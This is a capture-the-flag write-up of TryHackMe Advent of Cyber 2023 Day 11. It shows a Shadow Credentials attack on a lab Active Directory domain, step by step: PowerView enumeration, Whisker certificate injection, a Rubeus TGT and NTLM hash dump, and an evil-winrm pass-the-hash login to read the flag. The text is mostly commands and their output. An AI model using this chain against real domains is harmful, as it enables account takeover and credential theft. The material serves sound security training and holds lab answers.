# AoC 2023 - Day 11

> `Active Directory` Jingle Bells, Shadow Spells

## Learning Objectives
> - Understanding Active Directory
> - Introduction to Windows Hello for Business
> - Prerequisites for exploiting GenericWrite privilege
> - How the Shadow Credentials attack works
> - How to exploit the vulnerability

## Steps

Task completed using the split-view online, this is all new to me, so this was a complete walk-through.

The computer is vulnerable to AD-attacks.

```bash
cd C:\Users\hr\Desktop
powershell -ep bypass
..\PowerView.ps1
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

The interesting identity is `hr`.

```
IdentityReferenceName ObjectDN                                                    ActiveDirectoryRights
--------------------- --------                                                    ---------------------
hr                    CN=vansprinkles,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
```

> As you can see from the previous output, the user "hr" has the GenericWrite permission over the administrator object visible on the CN attribute. Later, we can compromise the account with that privilege by updating the msDS-KeyCredentialLink with a certificate. This vulnerability is known as the Shadow Credentials attack.

#### Running Whisker

`Whisker` is executed with the target `vansprinkles` from the previous output.

```
.\Whisker.exe add /target:vansprinkles
```

```
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:vansprinkles
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password Vt26exIdzZOlI1hW
[*] Searching for the target account
[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 09cd623c-65a4-4f0a-a5ed-2946a5a086b9
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"Vt26exIdzZOlI1hW" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

> The tool will conveniently provide the certificate necessary to authenticate the impersonation of the vulnerable user with a command ready to be launched using Rubeus.

#### Running Rubeus

```bash
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=vansprinkles
[*] Building AS-REQ (w/ PKINIT preauth) for: 'AOC.local\vansprinkles'
[*] Using domain controller: fe80::e545:2c0c:5254:9940%5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  12/17/2023 11:11:38 AM
  EndTime                  :  12/17/2023 9:11:38 PM
  RenewTill                :  12/24/2023 11:11:38 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  EWzB4DOwnDXw6KVqoJH9Kw==
  ASREP (key)              :  5F574E2099F840BF2BE57FD7763AD7D5

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : {REDACTED}
```

#### Evil-WinRM

Using `evil-winrm` from my Kali instance.

```bash
└─$ export box=10.10.61.70
└─$ evil-winrm -i $box -u vansprinkles -H {REDACTED}
```

```bash
*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/22/2023  10:56 AM                chatlog_files
-a----       11/22/2023  10:29 AM          11620 chatlog.html
-a----       10/16/2023   7:33 AM             17 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
THM{REDACTED}
```

## Question 1

> What is the hash of the vulnerable user?

The hash is obtained by running Rubeus.

## Question 2

> What is the content of flag.txt on the Administrator Desktop?

THM{REDACTED}